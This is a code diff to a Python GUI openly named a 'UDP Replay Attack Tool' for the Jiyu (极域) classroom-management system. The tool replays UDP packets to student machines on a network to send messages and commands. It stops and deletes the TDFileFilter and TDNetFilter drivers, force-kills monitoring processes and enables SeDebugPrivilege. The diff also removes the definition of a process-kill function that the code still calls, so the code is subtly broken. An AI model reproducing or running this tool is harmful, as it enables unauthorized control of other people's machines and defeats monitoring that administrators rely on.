@@ -37,6 +37,50 @@ basicCMD = {
     '-r': store[2],
     '-s': store[3],
 }
+
+LANG_TEXT = {
+    "中文": {
+        "title": "极域电子教室 UDP 重放攻击工具",
+        "language_label": "选择语言:",
+        "ip_label": "-ip (例如: 192.168.1.101 或 192.168.1.10-56 或 192.168.1.23/24):",
+        "local_net_label": "本机网卡:",
+        "detect_button": "检测本机网卡",
+        "port_label": "-p (端口):",
+        "cmd_label": "命令类型:",
+        "content_label": "消息/命令内容:",
+        "batch_checkbox": "批量命令执行（每行一条命令）",
+        "extra_label": "额外选项 (-e):",
+        "loop_label": "-l (循环次数):",
+        "interval_label": "-t (间隔秒):",
+        "info": "使用教程(以及关于)",
+        "scan": "扫描内网",
+        "unlock": "解除锁定",
+        "send": "开始执行",
+        "progress_ip": "[*] 检测到本机网卡网段: ",
+        "progress_none": "[-] 未检测到本机私有IP网段。"
+    },
+    "English": {
+        "title": "Jiyu UDP Replay Attack Tool",
+        "language_label": "Language:",
+        "ip_label": "-ip (e.g., 192.168.1.101 or 192.168.1.10-56 or 192.168.1.23/24):",
+        "local_net_label": "Local NIC:",
+        "detect_button": "Detect NIC",
+        "port_label": "-p (Port):",
+        "cmd_label": "Command Type:",
+        "content_label": "Message/Command Content:",
+        "batch_checkbox": "Batch Command Execution (one per line)",
+        "extra_label": "Extra Option (-e):",
+        "loop_label": "-l (Loop Count):",
+        "interval_label": "-t (Interval Seconds):",
+        "info": "Usage (About)",
+        "scan": "Scan Network",
+        "unlock": "Unlock",
+        "send": "Execute",
+        "progress_ip": "[*] Detected local network(s): ",
+        "progress_none": "[-] No private IP network found."
+    }
+}
+
 # ----------------------------
 
 def format_b4_send(content):
@@ -391,13 +435,12 @@ def action_share_local_disk(ip_text, port, loop_count, interval, content, log_ca
         threading.Thread(target=send_task, args=(ip,)).start()
 
 def action_unlock(log_callback):
-    """
-    解除文件、键盘、应用锁和网络锁：
-      执行命令：sc stop TDFileFilter 和 sc stop TDNetFilter
-    """
     try:
         popen("sc stop TDFileFilter")
         popen("sc stop TDNetFilter")
+        popen("sc delete TDFileFilter")
+        popen("sc delete TDNetFilter")
+        popen("taskkill /f /im masterhelper.exe")
         log_callback("[+] 成功执行解除锁定命令 (TDFileFilter 和 TDNetFilter)")
     except Exception as e:
         log_callback(f"[-] 解除锁定失败: {e}")
@@ -426,7 +469,7 @@ class InfoDialog(QDialog):
             "9. 多网卡自动检测：点击“检测本机网卡”自动填充 -ip\n"
             "10. 循环发送：-l 设置循环次数，-t 设置发送间隔\n"
             "11. 磁盘共享：选择 'map'，在命令内容中填写共享参数，例如 'MyC=C:\\'\n"
-            "12. 解除锁定：点击专用大按钮执行 sc stop TDFileFilter 和 sc stop TDNetFilter\n"
+            "12. 解除锁定：点击按钮执行接触命令\n"
             "13. 强制结束 StudentMain.exe：选择 'kill'，使用 NT API 强制结束该进程\n\n"
             "注意：请确保目标环境允许 UDP 数据包重放，并具备相应权限。"
         )
@@ -450,9 +493,14 @@ class MainWindow(QMainWindow):
 
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("极域电子教室 UDP 重放攻击工具")
+        # 默认语言：中文
+        self.current_language = "中文"
+        self.lang_text = LANG_TEXT[self.current_language]
+
+        self.setWindowTitle(self.lang_text["title"])
         self.resize(750, 700)
         self.initUI()
+
         self.progress_signal.connect(self.progressBar.setValue)
         self.set_max_signal.connect(self.progressBar.setMaximum)
         self.scan_timer = QTimer()
@@ -465,73 +513,84 @@ class MainWindow(QMainWindow):
         self.setCentralWidget(central)
         main_layout = QVBoxLayout()
 
-        # -ip 输入及多网卡检测
+        # 语言选择
+        lang_layout = QHBoxLayout()
+        self.lang_label = QLabel(self.lang_text["language_label"])
+        self.lang_combo = QComboBox()
+        self.lang_combo.addItems(LANG_TEXT.keys())  # ["中文", "English"]
+        self.lang_combo.currentTextChanged.connect(self.update_language)
+        lang_layout.addWidget(self.lang_label)
+        lang_layout.addWidget(self.lang_combo)
+        main_layout.addLayout(lang_layout)
+
+        # -ip
         ip_layout = QHBoxLayout()
-        ip_label = QLabel("-ip (例如: 192.168.80.101 或 192.168.80.10-56 或 192.168.80.23/24):")
+        self.ip_label = QLabel(self.lang_text["ip_label"])
         self.ip_edit = QLineEdit()
-        ip_layout.addWidget(ip_label)
+        ip_layout.addWidget(self.ip_label)
         ip_layout.addWidget(self.ip_edit)
         main_layout.addLayout(ip_layout)
 
+        # 本机网卡检测
         local_net_layout = QHBoxLayout()
-        local_net_label = QLabel("本机网卡:")
+        self.local_net_label = QLabel(self.lang_text["local_net_label"])
         self.local_net_combo = QComboBox()
-        detect_button = QPushButton("检测本机网卡")
-        detect_button.setFixedHeight(40)
-        detect_button.setStyleSheet("font-size: 16px;")
-        detect_button.clicked.connect(self.detectLocalNetworks)
-        local_net_layout.addWidget(local_net_label)
+        self.detect_button = QPushButton(self.lang_text["detect_button"])
+        self.detect_button.setFixedHeight(40)
+        self.detect_button.setStyleSheet("font-size: 16px;")
+        self.detect_button.clicked.connect(self.detectLocalNetworks)
+        local_net_layout.addWidget(self.local_net_label)
         local_net_layout.addWidget(self.local_net_combo)
-        local_net_layout.addWidget(detect_button)
+        local_net_layout.addWidget(self.detect_button)
         main_layout.addLayout(local_net_layout)
 
-        # -p 端口输入
+        # -p
         port_layout = QHBoxLayout()
-        port_label = QLabel("-p (端口):")
+        self.port_label = QLabel(self.lang_text["port_label"])
         self.port_edit = QLineEdit("4705")
-        port_layout.addWidget(port_label)
+        port_layout.addWidget(self.port_label)
         port_layout.addWidget(self.port_edit)
         main_layout.addLayout(port_layout)
 
-        # 命令类型选择
+        # 命令类型
         cmd_layout = QHBoxLayout()
-        cmd_label = QLabel("命令类型:")
+        self.cmd_label = QLabel(self.lang_text["cmd_label"])
         self.cmd_combo = QComboBox()
         self.cmd_combo.addItems(["-msg", "-c"])
-        cmd_layout.addWidget(cmd_label)
+        cmd_layout.addWidget(self.cmd_label)
         cmd_layout.addWidget(self.cmd_combo)
         main_layout.addLayout(cmd_layout)
 
-        # 消息/命令内容输入（多行）
+        # 消息/命令内容
         content_layout = QVBoxLayout()
-        content_label = QLabel("消息/命令内容:")
+        self.content_label = QLabel(self.lang_text["content_label"])
         self.content_edit = QTextEdit()
-        content_layout.addWidget(content_label)
+        content_layout.addWidget(self.content_label)
         content_layout.addWidget(self.content_edit)
         main_layout.addLayout(content_layout)
 
-        # 批量命令执行复选框
-        self.batch_checkbox = QCheckBox("批量命令执行（每行一条命令）")
+        # 批量命令
+        self.batch_checkbox = QCheckBox(self.lang_text["batch_checkbox"])
         main_layout.addWidget(self.batch_checkbox)
 
-        # 额外选项 (-e)
+        # 额外选项
         extra_layout = QHBoxLayout()
-        extra_label = QLabel("额外选项 (-e):")
+        self.extra_label = QLabel(self.lang_text["extra_label"])
         self.extra_combo = QComboBox()
         self.extra_combo.addItems(["无", "r", "s", "g", "nc", "map", "kill", "break", "continue"])
-        extra_layout.addWidget(extra_label)
+        extra_layout.addWidget(self.extra_label)
         extra_layout.addWidget(self.extra_combo)
         main_layout.addLayout(extra_layout)
 
-        # 循环次数与发送间隔
+        # 循环次数与间隔
         loop_layout = QHBoxLayout()
-        loop_label = QLabel("-l (循环次数):")
+        self.loop_label = QLabel(self.lang_text["loop_label"])
         self.loop_edit = QLineEdit("1")
-        interval_label = QLabel("-t (间隔秒):")
+        self.interval_label = QLabel(self.lang_text["interval_label"])
         self.interval_edit = QLineEdit("22")
-        loop_layout.addWidget(loop_label)
+        loop_layout.addWidget(self.loop_label)
         loop_layout.addWidget(self.loop_edit)
-        loop_layout.addWidget(interval_label)
+        loop_layout.addWidget(self.interval_label)
         loop_layout.addWidget(self.interval_edit)
         main_layout.addLayout(loop_layout)
 
@@ -540,38 +599,62 @@ class MainWindow(QMainWindow):
         self.progressBar.setValue(0)
         main_layout.addWidget(self.progressBar)
 
-        # 按钮区域：使用教程、扫描内网、以及解除锁定（专用大按钮）
+        # 按钮区域
         buttons_layout = QHBoxLayout()
-        info_button = QPushButton("使用教程(以及关于)")
-        info_button.setFixedHeight(40)
-        info_button.setStyleSheet("font-size: 16px;")
-        info_button.clicked.connect(self.showInfo)
-        scan_button = QPushButton("扫描内网")
-        scan_button.setFixedHeight(40)
-        scan_button.setStyleSheet("font-size: 16px;")
-        scan_button.clicked.connect(self.scanNetwork)
-        unlock_button = QPushButton("解除锁定")
-        unlock_button.setFixedHeight(40)
-        unlock_button.setStyleSheet("font-size: 16px;")
-        unlock_button.clicked.connect(lambda: threading.Thread(target=action_unlock, args=(self.log,)).start())
-        buttons_layout.addWidget(info_button)
-        buttons_layout.addWidget(scan_button)
-        buttons_layout.addWidget(unlock_button)
+        self.info_button = QPushButton(self.lang_text["info"])
+        self.info_button.setFixedHeight(40)
+        self.info_button.setStyleSheet("font-size: 16px;")
+        self.info_button.clicked.connect(self.showInfo)
+
+        self.scan_button = QPushButton(self.lang_text["scan"])
+        self.scan_button.setFixedHeight(40)
+        self.scan_button.setStyleSheet("font-size: 16px;")
+        self.scan_button.clicked.connect(self.scanNetwork)
+
+        self.unlock_button = QPushButton(self.lang_text["unlock"])
+        self.unlock_button.setFixedHeight(40)
+        self.unlock_button.setStyleSheet("font-size: 16px;")
+        self.unlock_button.clicked.connect(lambda: threading.Thread(target=action_unlock, args=(self.log,)).start())
+
+        buttons_layout.addWidget(self.info_button)
+        buttons_layout.addWidget(self.scan_button)
+        buttons_layout.addWidget(self.unlock_button)
         main_layout.addLayout(buttons_layout)
 
-        # 发送/执行按钮
-        self.send_button = QPushButton("开始执行")
+        # 开始执行按钮
+        self.send_button = QPushButton(self.lang_text["send"])
         self.send_button.setFixedHeight(40)
         self.send_button.setStyleSheet("font-size: 16px;")
         self.send_button.clicked.connect(self.startAction)
         main_layout.addWidget(self.send_button)
 
-        # 日志显示区域
+        # 日志显示
         self.log_output = QTextEdit()
         self.log_output.setReadOnly(True)
         main_layout.addWidget(self.log_output)
 
         central.setLayout(main_layout)
+
+    def update_language(self, language):
+        """切换语言后，更新所有相关文本"""
+        self.current_language = language
+        self.lang_text = LANG_TEXT[language]
+        self.setWindowTitle(self.lang_text["title"])
+        self.lang_label.setText(self.lang_text["language_label"])
+        self.ip_label.setText(self.lang_text["ip_label"])
+        self.local_net_label.setText(self.lang_text["local_net_label"])
+        self.detect_button.setText(self.lang_text["detect_button"])
+        self.port_label.setText(self.lang_text["port_label"])
+        self.cmd_label.setText(self.lang_text["cmd_label"])
+        self.content_label.setText(self.lang_text["content_label"])
+        self.batch_checkbox.setText(self.lang_text["batch_checkbox"])
+        self.extra_label.setText(self.lang_text["extra_label"])
+        self.loop_label.setText(self.lang_text["loop_label"])
+        self.interval_label.setText(self.lang_text["interval_label"])
+        self.info_button.setText(self.lang_text["info"])
+        self.scan_button.setText(self.lang_text["scan"])
+        self.unlock_button.setText(self.lang_text["unlock"])
+        self.send_button.setText(self.lang_text["send"])
 
     def log(self, msg):
         self.log_output.append(msg)
@@ -586,10 +669,10 @@ class MainWindow(QMainWindow):
             self.local_net_combo.clear()
             self.local_net_combo.addItems(nets)
             self.local_net_combo.setCurrentIndex(0)
-            self.ip_edit.setText(nets[0])
-            self.log("[*] 检测到本机网卡网段: " + ", ".join(nets))
+            # 这里示范如何使用语言字典中的提示
+            self.log(self.lang_text["progress_ip"] + ", ".join(nets))
         else:
-            self.log("[-] 未检测到本机私有IP网段。")
+            self.log(self.lang_text["progress_none"])
 
     def scanNetwork(self):
         ip_text = self.ip_edit.text().strip()
@@ -661,12 +744,12 @@ class MainWindow(QMainWindow):
                 threading.Thread(target=action_kill_studentmain_nt, args=(self.log,)).start()
                 return
             elif extra_option == "map":
-                # 磁盘共享功能：要求用户在内容框中填写共享参数，例如 "MyC=C:\"
                 content = self.content_edit.toPlainText().strip()
                 if not content:
                     self.log("[-] 请填写共享参数，例如 'MyC=C:\\'")
                     return
-                threading.Thread(target=action_share_local_disk, args=(ip_text, port, loop_count, interval, content, self.log)).start()
+                threading.Thread(target=action_share_local_disk,
+                                 args=(ip_text, port, loop_count, interval, content, self.log)).start()
                 return
             else:
                 data_list = basicCMD.get('-r') if extra_option == "r" else basicCMD.get('-s')
@@ -710,7 +793,7 @@ class MainWindow(QMainWindow):
                 try:
                     payload = pack("%dB" % len(data), *data)
                     client.sendto(payload, (ip, port))
-                    self.log(f"[+] 发送到 {ip}:{port} 第 {i+1} 次")
+                    self.log(f"[+] 发送到 {ip}:{port} 第 {i + 1} 次")
                 except Exception as ex:
                     self.log(f"[-] {ip} 发送错误：{ex}")
                 if i != loop_count - 1:
@@ -727,96 +810,52 @@ class MainWindow(QMainWindow):
         self.log("[*] 所有数据包发送完成。")
 
 
-def nt_terminate_process(pid, log_callback):
-    """
-    使用 NT 内部 API NtTerminateProcess 强制结束进程
-    """
-    PROCESS_TERMINATE = 0x0001
-    try:
-        handle = win32api.OpenProcess(PROCESS_TERMINATE, False, pid)
-    except Exception as e:
-        log_callback(f"[-] 打开进程 {pid} 失败: {e}")
-        return None
-    handle_int = int(handle)
-    ntdll = ctypes.WinDLL("ntdll")
-    NtTerminateProcess = ntdll.NtTerminateProcess
-    NtTerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
-    NtTerminateProcess.restype = ctypes.c_uint
-    status = NtTerminateProcess(ctypes.c_void_p(handle_int), 1)
-    win32api.CloseHandle(handle)
-    return status
-
-
-def action_kill_studentmain_nt(log_callback):
-    """
-    使用 NT API 强制结束 StudentMain.exe 进程
-    """
-    try:
-        output = subprocess.check_output('tasklist /FI "IMAGENAME eq StudentMain.exe"', shell=True).decode()
-        m = re.search(r"StudentMain\.exe\s+(\d+)", output)
-        if m:
-            pid = int(m.group(1))
-            log_callback(f"[+] 找到 StudentMain.exe, PID = {pid}")
-            result = nt_terminate_process(pid, log_callback)
-            if result == 0:
-                log_callback(f"[+] 进程 {pid} 已成功终止 (NT API)")
-            else:
-                log_callback(f"[-] NT API 终止进程 {pid} 失败，返回码: {result}")
-        else:
-            log_callback("[-] 未找到 StudentMain.exe 进程")
-    except Exception as e:
-        log_callback(f"[-] 调用 NT API 失败: {e}")
-
-def adjust_privileges():
-    """
-    启用当前进程的 SeDebugPrivilege 权限，
-    使得程序有更高的调试和终止进程的权限。
-    """
-    try:
-        # 获取当前进程的句柄
-        hProcess = win32api.GetCurrentProcess()
-        # 打开进程的访问令牌
-        hToken = win32security.OpenProcessToken(hProcess, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
-        # 获取 SeDebugPrivilege 的 LUID
-        privilege_id = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
-        # 准备调整令牌权限：启用 SeDebugPrivilege
-        new_privileges = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
-        win32security.AdjustTokenPrivileges(hToken, False, new_privileges)
-        win32api.CloseHandle(hToken)
-        print("[+] 已成功启用 SeDebugPrivilege")
-    except Exception as e:
-        print("[-] 调整权限失败：", e)
-
-def check_debug_privilege():
-    """
-    检查当前进程是否启用了 SeDebugPrivilege
-    返回 True 表示已启用，否则返回 False
-    """
-    try:
-        hProcess = win32api.GetCurrentProcess()
-        hToken = win32security.OpenProcessToken(hProcess, win32con.TOKEN_QUERY)
-        # 获取令牌中特权的列表
-        privs = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
-        # 获得 SE_DEBUG_NAME 对应的 LUID
-        debug_luid = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
-        for luid, flags in privs:
-            if luid == debug_luid:
-                win32api.CloseHandle(hToken)
-                return bool(flags & win32con.SE_PRIVILEGE_ENABLED)
-        win32api.CloseHandle(hToken)
-    except Exception as e:
-        # 如果发生异常，返回 False
-        return False
-
-# ==============================
+# ----------------------------
 # 程序入口
-# ==============================
+# ----------------------------
 if __name__ == '__main__':
+    # 调整权限以启用 SeDebugPrivilege
+    def adjust_privileges():
+        """
+        启用当前进程的 SeDebugPrivilege 权限，
+        使程序具有更高的调试和终止进程权限。
+        """
+        try:
+            hProcess = win32api.GetCurrentProcess()
+            hToken = win32security.OpenProcessToken(hProcess, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
+            privilege_id = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
+            new_privileges = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
+            win32security.AdjustTokenPrivileges(hToken, False, new_privileges)
+            win32api.CloseHandle(hToken)
+            print("[+] 已成功启用 SeDebugPrivilege")
+        except Exception as e:
+            print("[-] 调整权限失败：", e)
+
+
+    def check_debug_privilege():
+        """
+        检查当前进程是否启用了 SeDebugPrivilege，
+        返回 True 表示已启用，否则返回 False。
+        """
+        try:
+            hProcess = win32api.GetCurrentProcess()
+            hToken = win32security.OpenProcessToken(hProcess, win32con.TOKEN_QUERY)
+            privs = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
+            debug_luid = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
+            for luid, flags in privs:
+                if luid == debug_luid:
+                    win32api.CloseHandle(hToken)
+                    return bool(flags & win32con.SE_PRIVILEGE_ENABLED)
+            win32api.CloseHandle(hToken)
+        except Exception as e:
+            return False
+
+
     adjust_privileges()
     if check_debug_privilege():
-        print("Check:SeDebugPrivilege 已启用")
+        print("Check: SeDebugPrivilege 已启用")
     else:
-        print("Check:SeDebugPrivilege 未启用")
+        print("Check: SeDebugPrivilege 未能启用")
     app = QApplication(sys.argv)
     app.setFont(QFont("Microsoft YaHei", 10))
     window = MainWindow()
